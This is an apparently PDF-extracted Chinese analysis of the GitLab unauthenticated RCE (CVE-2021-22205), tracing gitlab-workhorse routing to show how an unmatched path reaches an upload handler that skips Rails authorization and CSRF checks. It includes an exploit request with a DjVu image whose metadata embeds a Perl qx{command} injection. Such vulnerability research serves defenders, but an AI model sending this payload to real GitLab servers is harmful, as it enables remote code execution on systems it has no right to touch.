1
CVE-OLON-OOOLS Gitlab 前台RCE 分析之 P。
接 https://t.zsxq.com/aYZzVbu  
公众号： https://mp.weixin.qq.com/s?
__biz=Mzg4NzcxMDgyOA==&mid=2247483654&idx=1&sn=8c0f99c646e63460d3190508613cac4
5&chksm=cf877405f8f0fd1382100c97af86db549084b987c515c848eb8a7faa92eaac7b5aeb0ac9
2ece#rd 
==========================================================================
====== 
从前⾯的分析，其实可以继续问⼏个问题。 
1、除了 uploads/user 接⼝，还有其他接⼝么？ 
2、是否真的需要 CSRF ，或者说 第⼀步是否是真的需要 
对于 ⼤部分 规则性的 waf，最简单的可能就是 正则匹配内容 ，请求⽅法/路径/POST包，基本
上封杀掉下⾯这个模式，已经能挡住绝⼤部分脚本⼩⼦了吧。。。 
2
但从我前⾯的 第2 部分来看  其实 routes.go 中的其他路由 可以拿过来利⽤ 
环境搭建 使⽤ https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-
22205/README.zh-cn.md 感谢P师傅。 
例如 
snippetUploadPattern 为  
Go
复制代码
POST /uploads/user HTTP/1.1
Content-Type: multipart/form-data; 
boundary=22f5e4b5ec8883262a0a1e07619d0efd
Content-Type: image/jpeg
AT&TFORM•••[DJVUINFO•••
••••••,•••BGjp••••ANTa•••5(metadata
    (Copyright "\
" . qx{command} . \
" b ") )
--22f5e4b5ec8883262a0a1e07619d0efd--
1
2
3
4
5
6
7
8
9
10
11
12
Go
复制代码
// Uploads
u.route("POST", projectPattern+`uploads\z`, upload.Accelerate(api, 
signingProxy, preparers.uploads)),
u.route("POST", snippetUploadPattern, upload.Accelerate(api, signingProxy, 
preparers.uploads)),
u.route("POST", userUploadPattern, upload.Accelerate(api, signingProxy, 
preparers.uploads)),
1
2
3
4
Go
复制代码
snippetUploadPattern = `^/uploads/personal_snippet`
1
3
其他路由也可以试试，（有可能需要登陆 ：） 
来解决第⼆个问题，= = CSRF Token 真的需要吗？ 回到 routes.go 
Go
复制代码
projectPattern       = `^/([^/]+/){1,}[^/]+/`
u.route("POST", projectPattern+`uploads\z`, upload.Accelerate(api, 
signingProxy, preparers.uploads)),
POST /1/1/uploads
1
2
3
4
5
4
先来看下 gitlab-workhorse 的是怎么匹配路由的  
Go
复制代码
// Routing table
// We match against URI not containing the relativeUrlRoot:
// see upstream.ServeHTTP
func configureRoutes(u *upstream) {
    preparers := createUploadPreparers(u.Config)
    uploadPath := path.Join(u.DocumentRoot, "uploads/tmp")
    uploadAccelerateProxy := 
upload.Accelerate(&upload.SkipRailsAuthorizer{TempPath: uploadPath}, 
proxy, preparers.uploads)
    ...
    // Serve static files or forward the requests
    defaultUpstream := static.ServeExisting(
        u.URLPrefix,
        staticpages.CacheDisabled,
        static.DeployPage(static.ErrorPagesUnless(u.DevelopmentMode, 
staticpages.ErrorFormatHTML, uploadAccelerateProxy)),
    )
    probeUpstream := static.ErrorPagesUnless(u.DevelopmentMode, 
staticpages.ErrorFormatJSON, proxy)
    healthUpstream := static.ErrorPagesUnless(u.DevelopmentMode, 
staticpages.ErrorFormatText, proxy)
    u.Routes = []routeEntry{ 
        u.route(...)
        ...
        u.route("", "", defaultUpstream),
    }
    // Routes which should actually be served locally by a Geo Proxy. If 
none
    // matches, then then proxy the request.
    u.geoLocalRoutes = []routeEntry{
        u.route(...)
        // Don't define a catch-all route. If a route does not match, then 
we know
        // the request should be proxied.
    }
}    
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
5
Go
复制代码
type routeEntry struct {
    method   string
    regex    *regexp.Regexp
    handler  http.Handler
    matchers []matcherFunc
}
# workhorse/internal/upstream/upstream.go:123
func (u *upstream) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    ...
    cleanedPath := prefix.Strip(URIPath)
    route := u.findRoute(cleanedPath, r)
    if route == nil {
        // The protocol spec in git/Documentation/technical/http-
protocol.txt
        // says we must return 403 if no matching service is found.
        helper.HTTPError(w, r, "Forbidden", http.StatusForbidden)
        return
    }
    for _, h := range requestHeaderBlacklist {
        r.Header.Del(h)
    }
    route.handler.ServeHTTP(w, r)
}
# workhorse/internal/upstream/upstream.go:166
func (u *upstream) findRoute(cleanedPath string, r *http.Request) 
*routeEntry {
    if u.enableGeoProxyFeature {
        if route := u.findGeoProxyRoute(cleanedPath, r); route != nil {
            return route
        }
    }
    for _, ro := range u.Routes {
        if ro.isMatch(cleanedPath, r) {
            return &ro
        }
    }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
6
⽽在 routeEntry 中有  u.route("", "", defaultUpstream),   也即 
当 请求到不在 route 表⾥具体指定的路径时，例如随便请求⼀个路由， GET /aaaaaaaaaa  
对应到 routes.go 中的 isMatch 即 ro.regex.MatchString(cleanedPath)  
    return nil
}
# workhorse/internal/upstream/routes.go:155
func (ro *routeEntry) isMatch(cleanedPath string, req *http.Request) bool 
{
    if ro.method != "" && req.Method != ro.method {
        return false
    }
    if ro.regex != nil && !ro.regex.MatchString(cleanedPath) {
        return false
    }
    ok := true
    for _, matcher := range ro.matchers {
        ok = matcher(req)
        if !ok {
            break
        }
    }
    return ok
}
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
Go
复制代码
    method   string            => ""
    regex    *regexp.Regexp    => ""
    handler  http.Handler      => defaultUpstream
1
2
3
7
因此会进⼊  defaultUpstream   也即这段逻辑 
进⽽调⽤  static.ServeExisting  workhorse/internal/staticpages/servefile.go:29 
Go
复制代码
    uploadAccelerateProxy := 
upload.Accelerate(&upload.SkipRailsAuthorizer{TempPath: uploadPath}, 
proxy, preparers.uploads)
    ...
    // Serve static files or forward the requests
    defaultUpstream := static.ServeExisting(
        u.URLPrefix,
        staticpages.CacheDisabled,
        static.DeployPage(static.ErrorPagesUnless(u.DevelopmentMode, 
staticpages.ErrorFormatHTML, uploadAccelerateProxy)),
    )
1
2
3
4
5
6
7
8
9
8
notFoundHandler  也即 
static.DeployPage(static.ErrorPagesUnless(u.DevelopmentMode, 
staticpages.ErrorFormatHTML, uploadAccelerateProxy))  
Go
复制代码
// BUG/QUIRK: If a client requests 'foo%2Fbar' and 'foo/bar' exists,
// handleServeFile will serve foo/bar instead of passing the request
// upstream.
func (s *Static) ServeExisting(prefix urlprefix.Prefix, cache CacheMode, 
notFoundHandler http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if notFoundHandler == nil {
            notFoundHandler = http.HandlerFunc(http.NotFound)
        }
        // We intentionally use r.URL.Path instead of r.URL.EscaptedPath() 
below.
        // This is to make it possible to serve static files with e.g. a 
space
        // %20 in their name.
        relativePath, err := s.validatePath(prefix.Strip(r.URL.Path))
        if err != nil {
            notFoundHandler.ServeHTTP(w, r)
            return
        }
        file := filepath.Join(s.DocumentRoot, relativePath)
        if !strings.HasPrefix(file, s.DocumentRoot) {
            log.WithRequest(r).WithError(errPathTraversal).Error()
            notFoundHandler.ServeHTTP(w, r)
            return
        }
        ...
    })
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
9
这⾥进⼀步进⼊到 handler.ServeHTTP(w, r)  即 static.ErrorPagesUnless   
workhorse/internal/staticpages/error_pages.go:125 
因此进⼊到 uploadAccelerateProxy   即 routes.go  中的
Go
复制代码
func (s *Static) DeployPage(handler http.Handler) http.Handler {
    deployPage := filepath.Join(s.DocumentRoot, "index.html")
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        data, err := ioutil.ReadFile(deployPage)
        if err != nil {
            handler.ServeHTTP(w, r)
            return
        }
        helper.SetNoCacheHeaders(w.Header())
        w.Header().Set("Content-Type", "text/html; charset=utf-8")
        w.WriteHeader(http.StatusOK)
        w.Write(data)
    })
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
Go
复制代码
func (st *Static) ErrorPagesUnless(disabled bool, format ErrorFormat, 
handler http.Handler) http.Handler {
    if disabled {
        return handler
    }
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        rw := errorPageResponseWriter{
            rw:     w,
            path:   st.DocumentRoot,
            format: format,
        }
        defer rw.flush()
        handler.ServeHTTP(&rw, r)
    })
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
10
⽽ upload.Accelerate  的逻辑 就是前⾯第 1 、2 部分中分析过的触发点。 
Accelerate 摘录⾄此： 
对⽐⼀下之前POC触发点，先是通过了 api 即 apiclient 向后端 rails-web 发起 
/uploads/user/authorize 取得响应后调⽤ HandleFileUploads(w, r, h, a, s, opts)  
⽽ 这⾥的逻辑是 &upload.SkipRailsAuthorizer{TempPath: uploadPath}  
在  
workhorse/internal/upload/skip_rails_authorizer.go:8  
Go
复制代码
uploadAccelerateProxy := 
upload.Accelerate(&upload.SkipRailsAuthorizer{TempPath: uploadPath}, 
proxy, preparers.uploads)
1
2
Go
复制代码
func Accelerate(rails PreAuthorizer, h http.Handler, p Preparer) 
http.Handler {
    return rails.PreAuthorizeHandler(func(w http.ResponseWriter, r 
*http.Request, a *api.Response) {
        s := &SavedFileTracker{Request: r}
        opts, _, err := p.Prepare(a)
        if err != nil {
            helper.Fail500(w, r, fmt.Errorf("Accelerate: error preparing 
file storage options"))
            return
        }
        HandleFileUploads(w, r, h, a, s, opts)
    }, "/authorize")
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
Go
复制代码
u.route("POST", userUploadPattern, upload.Accelerate(api, signingProxy, 
preparers.uploads)),
1
2
11
换句话说 这⾥构造了⼀个 假的本地API，从⽽直接返回，毕竟在开发⼈员看来 这⾥只是为了构造 
static page 或 ErrorPagesUnless ，可以不需要往后端 rails-web 中再去取数据，因为请求没有流转
到后端 rails ，换句话说 并没有触发CSRF检验 = =。 
所以综上所述，可以构造这样的数据包 
Go
复制代码
// SkipRailsAuthorizer implements a fake PreAuthorizer that do not calls 
rails API and
// authorize each call as a local only upload to TempPath
type SkipRailsAuthorizer struct {
    // TempPath is the temporary path for a local only upload
    TempPath string
}
// PreAuthorizeHandler implements PreAuthorizer. It always grant the 
upload.
// The fake API response contains only TempPath
func (l *SkipRailsAuthorizer) PreAuthorizeHandler(next api.HandleFunc, _ 
string) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        next(w, r, &api.Response{TempPath: l.TempPath})
    })
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
12
⽆需 CSRF ⽆需 Cookie Session，也不⽤任何路径，⼀个请求搞定。 
==========================================================================
======= 
公众号： https://mp.weixin.qq.com/s?
__biz=Mzg4NzcxMDgyOA==&mid=2247483654&idx=1&sn=8c0f99c646e63460d3190508613cac4
13
5&chksm=cf877405f8f0fd1382100c97af86db549084b987c515c848eb8a7faa92eaac7b5aeb0ac9
2ece#rd